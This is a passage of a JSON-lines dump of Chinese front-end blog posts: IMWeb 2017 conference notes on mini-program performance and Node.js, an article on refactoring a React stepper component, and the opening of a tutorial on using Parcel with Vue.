worker\u003c/li\u003e\u003cli\u003e渲染：diff算法\u003c/li\u003e\u003c/ul\u003e\u003cp\u003e\u003cb\u003e\u003c/b\u003e\u003c/p\u003e\u003cul\u003e\u003cli\u003e预加载优化\u003cul\u003e\u003cli\u003e小程序会在打开一个页面的时候，先加载下一个页面的\u003ccode\u003epage_frame\u003c/code\u003e，加载时会自动拷贝\u003ccode\u003epage\u003c/code\u003e对象，因此，我们可以提前在\u003ccode\u003epage\u003c/code\u003e对象里注入数据。\u003c/li\u003e\u003cli\u003e开发者可以自己预测用户可能会点击的下一个页面，并将数值缓存到\u003ccode\u003elocalstorage\u003c/code\u003e\u003c/li\u003e\u003cli\u003e对媒体资源如图片等设定长宽，防止\u003ccode\u003ereflow\u003c/code\u003e的时候画面闪动（AMP）\u003c/li\u003e\u003c/ul\u003e\u003c/li\u003e\u003c/ul\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/8d99ec380cd9d5f71b6d1ab98d39afa1\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/71929988e8f50b9e37eddfca5223c18b\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003eios 300ms\u003c/p\u003e\u003cp\u003e\n\n\u003c/p\u003e\u003cp\u003eandroid 更多一点\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/bb77dfd3e4313597fabe3f6948b3cae5\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/2a1a7d217e1110cde297d8c9cc865fb4\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003emerge，data和function\u0026nbsp;\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/0d199a72d5c24a4343fc917a0087c7a5\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e腾讯内部团队测试过，如果增加到100个属性，iphone6上渲染会延迟150ms，如果是复杂的数组就更多了.\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/ae4f5032fadf863c74797d01434e9b7f\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/986fb870d308df7fc7655837496e1786\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003eLOADING 设置门槛值，超过500ms才显示Loading，那501ms的怎么办，强制显示1s，有个过渡，不会闪过.\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/9f57c53159733027e13db1519f730add\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/ab156b942bafa6946db6789424102236\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/f696eec79b96dd067d2092ec62c72501\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/81fa336a2e90a365c64a0c0bf5a67c91\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/a8312bef3edcfc00b6e4dbcc57804b15\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e------ 分割线 ----\u003c/p\u003e\u003cp\u003e（1）会后请教王老师到底能否实现 $('#ID') 这种形式呢？\u003c/p\u003e\u003cdiv\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/50865ad92245f65d0d6cbffb85507bcc\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cp\u003e果然在小程序文档里面找到了相关查找Dom节点的东西。传送门：\u003cb\u003e\u003ca href=\"https://mp.weixin.qq.com/debug/wxadoc/dev/api/\"\u003eWXML节点信息 API 列表。\u003c/a\u003e\u003c/b\u003e\u003c/p\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/a63e4aedfc452a111ab09d7ac4788213\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cp\u003e（2）菊花图优化加载体验不一致\u003c/p\u003e\u003cp\u003e会上王老师说loading状态有快有慢，会出现loading一下嗖的就出现内容，给人体验不够友好，就可以强制使得loading动画加载1s或者1.5s（机智）。其实觉得css加载模仿头条/网易的形式也可行的。\u003c/p\u003e\u003cp\u003e(3) 获取编译后代码来剖析\u003c/p\u003e\u003cp\u003e王老师建议把安卓手机Root，进入微信目录寻找小程序相关文件就好。\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e最后感谢王跃老师的干货分享和乐于解答。\u003c/p\u003e\u003cp\u003e---------\u003c/p\u003e\u003ch2\u003e四、《大前端全栈修炼之道 -- 愈演愈烈的Node.js》-- 狼叔\u003c/h2\u003e\u003cp\u003e狼叔的开场有趣，整场非常活跃，而且最后一场了还有很多人来听，但是笔记...太有趣了没做完整 哈哈~ （这不能怪我~ 啊呜~）\u003c/p\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/f6deaa26bf57fc81dda22da38fbe4834\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cbr\u003e\u003c/div\u003e\u003cp\u003e有趣的开场，色彩分明的标签，哇喔~\u003c/p\u003e\u003cdiv\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/8c684ef6177013c8c071ecd10a13c888\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/1a52781f0a083215e81cb864aea317c6\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/65b1144a6afc11ce2c8fa03d4729fe41\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cp\u003e技术栈演变与发展\u003c/p\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/57d120e319e8f1e18b4e9852fc4c191c\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e线代Web开发的四个维度：预编译 + 前端发展 + 呈现工具 + 构建系统\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/fe9763e5b382a8d3a45f99a26370bf12\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cp\u003e\u003cb\u003e\u003cbr\u003e\u003c/b\u003e\u003c/p\u003e\u003cp\u003e\u003cb\u003e就只有这么些？\u003c/b\u003e\u003c/p\u003e\u003cdiv\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/3a3b2e93275cfcc8a55e8d1e5e52a1b5\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cp\u003e个人发展趋势\u003c/p\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/9e59cba5e2e4265abd8e1536eb1e7735\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e你一定不知道的应用场景。\u003c/p\u003e\u003cdiv\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/6162d15e2964a7accda0a1d5495b0667\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e进入正题，什么是更加了不起的js\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/5a0dda5974def94c09e3fcd054db34be\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/edd8eed0fdc2f9ae7e0c1b37d916cd83\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/f403aceeda760b2f1323b9918179ff3d\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/1a000535cfa1749afb0aa9acf80f7491\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/3cc101d630577ed59518de812926cbca\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/27ad22c351587dfdfd8113df1fee1faf\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/78636f47f7aef0c65fa9f3c68efaca25\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/8d5852da7897b58fbf57f392167be463\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/18/e06fd1d230e4d1bafda5ad4e200361b6\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cp\u003e更完整内容 在 \u003ca href=\"https://mp.weixin.qq.com/s?__biz=MzAwMDU1MTE1OQ==\u0026amp;mid=405001493\u0026amp;idx=1\u0026amp;sn=f0ecab9b31bad83fb065ac37bb728245\u0026amp;scene=1\u0026amp;srcid=0324iTRH12WbXL5VDxXnEhH8\u0026amp;key=710a5d99946419d938a0ffc16a3c72118eefbe33f3f8312ed218bccbde126b60e818c8eb1068a9b07bdc8116a077b911\u0026amp;ascene=0\u0026amp;uin=NDIzMjM3MDk1\u0026amp;devicetype=iMac+MacBookPro11%2C1+OSX+OSX+10.10.5+build(14F27)\u0026amp;version=11000006\u0026amp;pass_ticket=xdp3crkTJPuOH6ggUMKnwvfDGKEnMUvwC5V%2FdxlW%2FKdNO9R8zI1xsDFSR4ZJECUU\"\u003e《一名全栈工程师Node.js之路》\u003c/a\u003e和 \u003ca href=\"https://github.com/i5ting/nodejs-fullstack/\"\u003e高可用架构专用《全栈工程师之路-Node.js》https://github.com/i5ting/nodejs-fullstack/\u003c/a\u003e\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e----------------\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003ch2\u003e最后的圆桌会议环节：\u003c/h2\u003e\u003cp\u003e选两个有意思的回答：\u003c/p\u003e\u003cp\u003e(1) \u0026nbsp;问w3c经理Philippe Le Hegaret：先入境前端发展越来越快，W3C会不会跟不上前端界的新技术的蓬勃发展。\u003c/p\u003e\u003cp\u003ePhilippe很自信的回答：不会的，浏览器厂商一直在抱怨我们的标准制定的太快了，他们来不及实现。就如PWA六七年前已经提出来了。年轻人，先有标准，才有浏览器实现。\u003c/p\u003e\u003cp\u003e(2) \u0026nbsp;一个大三女孩子的提问(先为她来到这里、然后听到最后的勇气鼓掌)：\u003c/p\u003e\u003cp\u003e\u0026nbsp; \u0026nbsp; \u0026nbsp; 如何准备实习和进入前端这个领域呢？\u003c/p\u003e\u003cp\u003e他们的答案，从两个点来说，第一个就是说从知识面来准备，就是走T字形路线，之前说的从广度跟深度，慢慢延伸。另一个回答的就是找名企实习，通常的话基本上在前一年就开始准备了，一说就是大二大三就开始准备。\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e------\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cb\u003e为什么昨天没整理完呢?\u0026nbsp;\u003c/b\u003e\u003c/p\u003e\u003cp\u003e职业病犯了啥都都干不了，脖子疼的真是~\u003c/p\u003e\u003cp\u003e有纰漏欢迎指出，\u003ci\u003e参加IMWeb2017还是收获挺多的 ，\u003c/i\u003e\u003cb\u003e很高兴与你分享！\u003c/b\u003e\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e","buildTime":"1514880764.2978","__v":0}
{"_id":{"$oid":"5a4cc1fa37991328ecbc7460"},"id":"5a4c43aaf265da43052f0272","author":{"$oid":"5a4b770f19da8721f49c06f8"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2018/1/3/160b9e8d468a3ae8?w=1520\u0026h=1790\u0026f=png\u0026s=353208","https://user-gold-cdn.xitu.io/2018/1/3/160b9fa4408e64db?w=1512\u0026h=1772\u0026f=png\u0026s=376589","https://user-gold-cdn.xitu.io/2018/1/3/160b9e9360bf2511?w=1458\u0026h=1382\u0026f=png\u0026s=222152","https://user-gold-cdn.xitu.io/2017/11/17/15fc7e84adafedc2?imageView2/0/w/1280/h/960/ignore-error/1"],"screenShot":null}],"title":"抽丝剥茧 - 实例简析重构代码的三板斧","meta":{"likeCount":0},"tag":[],"comment":[],"shortContent":"I. 太阳之下无新事：如何面对既有代码 可以说，任何软件系统从设计部署好的第二天起，就都变成了 既有代码(existing code)。一个几年的系统和一个几周的系统中存在的问题，并无本质上的差异。 俗话说，创业容易守业难。比新搭建一个系统更常见的工作，正是对既有系统的日常维护…","content":"\u003ch2 class=\"heading\"\u003eI. 太阳之下无新事：如何面对既有代码\u003c/h2\u003e\n\u003ch3 class=\"heading\"\u003e既有代码\u003c/h3\u003e\n\u003cp\u003e可以说，任何软件系统从设计部署好的第二天起，就都变成了 \u003cstrong\u003e既有代码(existing code)\u003c/strong\u003e。一个几年的系统和一个几周的系统中存在的问题，并无本质上的差异。\u003c/p\u003e\n\u003cp\u003e俗话说，创业容易守业难。比新搭建一个系统更常见的工作，正是对既有系统的日常维护，一般包括：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e添加新特性\u003c/li\u003e\n\u003cli\u003e修正bug\u003c/li\u003e\n\u003cli\u003e优化设计和性能\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e如何有效进行这些工作，而不是陷入“修复一个bug，还你几个新bug”的恶性循环，是每个开发者必然面对的课题。\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e遗留代码\u003c/h3\u003e\n\u003cp\u003e既有代码的一种极端情况，就 是\u003cstrong\u003e遗留代码(legacy code)\u003c/strong\u003e，一般指那些无人再维护的，或架构非常过时，亦或运行在老旧的操作系统上的代码。\u003c/p\u003e\n\u003cp\u003e相比于在大抵上每几天就打个照面的既有代码中修修改改；当面对一头雾水的遗留代码时，如果没有正确的方法，即便再小心翼翼，也总会陷入束手无策的境地。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003eII. 既有代码的困境\u003c/h2\u003e\n\u003cp\u003e每个开发者可能都见过奇奇怪怪的各种具体问题，但归纳起来，主要有这么三种情况：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e过重的依赖：实例化或方法调用的过程中，过多过深的依赖于其他类或组件\u003c/li\u003e\n\u003cli\u003e错误的封装：类或组件承担了不应有或过多的功能\u003c/li\u003e\n\u003cli\u003e裸奔的功能：没有测试代码或过时、不完整的测试覆盖\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 class=\"heading\"\u003eIII. 重构的意义\u003c/h2\u003e\n\u003cp\u003e面对以上困境，需要做的就是重构：\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e在不改变代码功能的前提下，改善其设计的行为被称为 \u003cstrong\u003e重构(refactor)\u003c/strong\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e重构的意义：使既有代码更具可维护性，并消除其不确定性\u003c/p\u003e\n\u003cp\u003e重构的关键：在其过程中不应该有任何功能上的改变\u003c/p\u003e\n\u003cp\u003e在之前提到过的几种日常工作中，无一例外不需要先进行有效的重构，才能保证工作的顺利进行。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003eIV. 重构三板斧：解开依赖、合理封装、测试覆盖\u003c/h2\u003e\n\u003cp\u003e同样显而易见的是，将三重困境一一化解，就可以达到理想的重构：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e依赖：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e简化导致逻辑复杂的过重依赖，将关注点从散布在艰深冗长的调用链条中拉回来\u003c/li\u003e\n\u003cli\u003e设置setter方法或借鉴interface的思路等，解决由于关联了太多其他类或组件，从而无法在测试用例中实例化和调用方法的问题\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e封装：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e类或组件只应该承担尽量简单而少量的职责，过长的类或组件应抽取成多个\u003c/li\u003e\n\u003cli\u003e类或组件不应当包含其子层级或兄弟层级的逻辑\u003c/li\u003e\n\u003cli\u003e出现在多处的重复代码总是可疑的，应该尽量抽象和提取出来\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e测试：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e测试的作用就是检验正确性和检验变化\u003c/li\u003e\n\u003cli\u003e回归测试(regression testing)：周期性的运行测试，来检验已知的良好行为是否依然正常工作。\u003c/li\u003e\n\u003cli\u003e单元测试(unit testing)：是指对软件中的最小可测试单元进行检查和验证；在 JS 中“单元”一般可以认为是一个函数或一个类。\u003c/li\u003e\n\u003cli\u003e测试用例(test case)：就是设定输入数据，运行被测试函数，然后判断实际输出是否符合预期\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e简而言之，前两项是最后“落在实处”的工作，而测试的重要性并不亚于任何工作，甚至是保证前两项进行下去的关键。 **测试覆盖率(test coverage)**越高，说明所覆盖部分的可靠性越有保证，而不必时时担心改动带来的未知影响。\u003c/p\u003e\n\u003cp\u003e遵循为独立单元（视情况为函数、类或组件等）编写测试的理念，就可以写出小而易理解的一个个测试用例，也反过来使得代码比写注释更容易理解。\u003c/p\u003e\n\u003cp\u003e对于新开发的功能，可以用测试驱动开发(TDD)的方法，即重复“写一点代码-\u0026gt;编写测试-\u0026gt;失败-\u0026gt;修改代码-\u0026gt;测试通过”的过程，最终达到方法的完成。\u003c/p\u003e\n\u003cp\u003e对于既有代码，可以根据日常需求，对涉及到的部分逐步引入单元测试，持续不断的提高系统的测试覆盖率。\u003c/p\u003e\n\u003ch2 class=\"heading\"\u003eV. 一个stepper组件的重构实例\u003c/h2\u003e\n\u003cp\u003e这里举一个足够简单也比较典型的例子：\u003cem\u003e重构stepper组件\u003c/em\u003e\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e场景描述：\u003c/h3\u003e\n\u003cp\u003e在这个由 react 组件构建的既有系统中，在若干界面中都引用了一个常见的 \u003cstrong\u003e数字选择器(numeric stepper)\u003c/strong\u003e，其变化会触发判断逻辑，提示商品对应的数量是否有足够库存、是否达到了限购数量等\u003c/p\u003e\n\u003ch3 class=\"heading\"\u003e既有的结构和问题：\u003c/h3\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/3/160b9e8d468a3ae8?w=1520\u0026amp;h=1790\u0026amp;f=png\u0026amp;s=353208\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e“全局”组件\u003ccode\u003eNumberStepper\u003c/code\u003e里糅杂了具体业务逻辑“限购”和“库存”的判断\u003c/li\u003e\n\u003cli\u003e以上判断逻辑冒泡到各种容器组件中，“演化”出了同一函数的不同签名形式 -- 梳理后发现：虽然参数定义不同且含糊不清，实际要达成的逻辑却是一样的\u003c/li\u003e\n\u003cli\u003e相关的逻辑判断代码和弹窗jsx结构，均重复出现于不同组件中\u003c/li\u003e\n\u003cli\u003e在\u003ccode\u003eNumberStepper\u003c/code\u003e和各种容器组件中，均分别存在用 \u003ccode\u003e0|1|2|3\u003c/code\u003e 定义的判断和显示逻辑，且无注释说明\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 class=\"heading\"\u003e问题的分解：\u003c/h3\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/3/160b9fa4408e64db?w=1512\u0026amp;h=1772\u0026amp;f=png\u0026amp;s=376589\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth style=\"text-align:center\"\u003e困境\u003c/th\u003e\n\u003cth style=\"text-align:center\"\u003e问题A\u003c/th\u003e\n\u003cth style=\"text-align:center\"\u003e问题B\u003c/th\u003e\n\u003cth style=\"text-align:center\"\u003e问题C\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd style=\"text-align:center\"\u003e依赖过重\u003c/td\u003e\n\u003ctd style=\"text-align:center\"\u003e\u003c/td\u003e\n\u003ctd style=\"text-align:center\"\u003e√\u003c/td\u003e\n\u003ctd style=\"text-align:center\"\u003e√\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd style=\"text-align:center\"\u003e封装错误\u003c/td\u003e\n\u003ctd style=\"text-align:center\"\u003e√\u003c/td\u003e\n\u003ctd style=\"text-align:center\"\u003e√\u003c/td\u003e\n\u003ctd style=\"text-align:center\"\u003e√\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd style=\"text-align:center\"\u003e缺乏测试\u003c/td\u003e\n\u003ctd style=\"text-align:center\"\u003e√\u003c/td\u003e\n\u003ctd style=\"text-align:center\"\u003e\u003c/td\u003e\n\u003ctd style=\"text-align:center\"\u003e√\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch3 class=\"heading\"\u003e问题的解决：\u003c/h3\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/3/160b9e9360bf2511?w=1458\u0026amp;h=1382\u0026amp;f=png\u0026amp;s=222152\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e在测试的保护下，将\u003ccode\u003eNumberStepper\u003c/code\u003e中的具体业务逻辑依赖删除\u003c/li\u003e\n\u003cli\u003e为\u003ccode\u003eNumberStepper\u003c/code\u003e暴露\u003ccode\u003eprops.checkLimit\u003c/code\u003e，在数量增减时响应，将判断逻辑交给调用者\u003c/li\u003e\n\u003cli\u003e统一判断逻辑\u003ccode\u003eonLimitOver\u003c/code\u003e的函数签名，明确参数的意义\u003c/li\u003e\n\u003cli\u003e将展现部分的逻辑和界面分别提取为单一的部分，统一调用\u003c/li\u003e\n\u003cli\u003e将之前用数字区分的逻辑归纳成常量类，交由各处统一调用\u003c/li\u003e\n\u003cli\u003e为\u003ccode\u003eNumberStepper\u003c/code\u003e和\u003ccode\u003eOverLimit\u003c/code\u003e等组件编写测试，保证改动的全面和正确性\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 class=\"heading\"\u003eVI. 总结\u003c/h2\u003e\n\u003cp\u003e至此，之前的结构得到了有效的梳理；再进行相关的功能添加就有章可循、心中有数了。\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e处理大部分“添加新特性、修正bug和优化”类的日常工作时，需要科学具体的方法论\u003c/li\u003e\n\u003cli\u003e过重的依赖、错误的封装、缺少测试，是既有代码的常见问题\u003c/li\u003e\n\u003cli\u003e有针对性的从以上三个方面入手，并辅以必要的单元测试，就可以保证工作有条理的进行下去\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 class=\"heading\"\u003eVII. 参考资料\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003ehttps://book.douban.com/subject/2248759/\u003c/li\u003e\n\u003cli\u003ehttps://en.wikipedia.org/wiki/Legacy_code\u003c/li\u003e\n\u003cli\u003ehttps://www.tuicool.com/articles/3QRBRr\u003c/li\u003e\n\u003cli\u003ehttps://baike.baidu.com/item/单元测试\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003ccenter\u003e\u003cstrong\u003e(end)\u003c/strong\u003e\u003c/center\u003e\u003cp\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003ccenter\u003e\n长按二维码或搜索 fewelife 关注我们哦\n\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/11/17/15fc7e84adafedc2?imageView2/0/w/1280/h/960/ignore-error/1\"\u003e\n\u003c/center\u003e","buildTime":"1514979405.0965","__v":0}
{"_id":{"$oid":"5a4cc287fa7d97296c4556c8"},"id":"5a3a6499518825094862ad2a","author":{"$oid":"5a4cc287fa7d97296c4556b6"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2017/12/20/16074195e68cbdc9?w=1121\u0026h=492\u0026f=png\u0026s=80815"],"screenShot":null}],"title":"从 webpack 到全面拥抱 Parcel #2 让 Parcel 支持 vue","meta":{"likeCount":0},"tag":[],"comment":[],"shortContent":"默认情况下 Parcel 是支持 React 和 Preact，可以通过查看下面这个页面得知。 要让 Parcel 支持 vue，需要简单处理一下。（下面的方法是我尝试的，如果有更好的，欢迎评论留言） 首先初始化一个项目。 接着安装 vue。 然后写一些 vue 的代码。 可能…","content":"\u003cp\u003e原文发表于：\u003ca target=\"_blank\" href=\"https://www.rails365.net/articles/cong-webpack-dao-quan-mian-yong-bao-parcel-2-rang-parcel-zhi-chi-vue\"\u003ewww.rails365.net\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e相关链接（网友提供）：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://github.com/lc60005457/parcel-plugin-vue\"\u003eparcel-plugin-vue\u003c/a\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca target=\"_blank\" href=\"https://github.com/zlxbuzz/parcel-demo\"\u003eparcel-demo\u003c/a\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e默认情况下 Parcel 是支持 React 和 Preact，可以通过查看下面这个页面得知。\u003c/p\u003e\n\u003cp\u003ehttps://parceljs.org/recipes.html\u003c/p\u003e\n\u003cp\u003e要让 Parcel 支持 vue，需要简单处理一下。（下面的方法是我尝试的，如果有更好的，欢迎评论留言）\u003c/p\u003e\n\u003cp\u003e首先初始化一个项目。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e$ mkdir parcel-vue\n$ \u003cspan class=\"hljs-built_in\"\u003ecd\u003c/span\u003e parcel-vue\n$ npm init -y\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e接着安装 vue。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003e$ npm install vue\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cstrong\u003eindex.html\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs html\" lang=\"html\"\u003e\u003cspan class=\"hljs-meta\"\u003e\u0026lt;!DOCTYPE html\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ehtml\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003elang\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"en\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan 